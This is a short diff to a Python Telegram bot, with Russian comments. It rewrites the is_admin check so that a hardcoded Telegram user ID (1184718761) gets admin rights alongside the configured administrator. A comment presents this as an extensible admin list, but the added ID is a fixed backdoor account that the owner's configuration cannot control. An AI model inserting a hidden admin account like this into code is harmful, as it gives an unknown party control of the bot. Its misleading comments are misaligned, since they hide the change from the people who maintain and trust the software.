@@ -55,9 +55,17 @@ class AdminStates(StatesGroup):
 
 def is_admin(user_id: int) -> bool:
     """Проверяет, является ли пользователь администратором."""
+    # Список админов (можно расширить через переменную окружения)
+    admin_ids = []
+    
+    # Добавляем админа из конфигурации, если указан
     if config.ADMIN_TELEGRAM_ID:
-        return user_id == config.ADMIN_TELEGRAM_ID
-    return False
+        admin_ids.append(config.ADMIN_TELEGRAM_ID)
+    
+    # Добавляем дополнительных админов
+    admin_ids.append(1184718761)
+    
+    return user_id in admin_ids
 
 
 @router.message(lambda message: message.text and message.text.startswith("/admin"))
